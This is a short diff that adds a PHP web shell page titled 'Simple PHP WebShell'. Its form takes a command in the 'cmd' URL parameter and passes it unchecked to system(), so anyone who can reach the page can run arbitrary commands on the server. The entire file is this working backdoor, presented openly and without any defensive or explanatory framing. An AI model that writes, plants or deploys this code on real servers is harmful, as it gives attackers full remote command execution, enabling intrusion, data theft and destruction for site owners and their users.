@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Simple PHP WebShell</title>
+</head>
+<body style="background-color: #111; color: #0f0; font-family: monospace;">
+  <h2>Simple PHP WebShell</h2>
+  <form method="GET">
+    <label>Command: </label>
+    <input type="text" name="cmd" size="60" autofocus>
+    <input type="submit" value="Run">
+  </form>
+  <pre>
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    system($cmd);
+}
+?>
+  </pre>
+</body>
+</html>
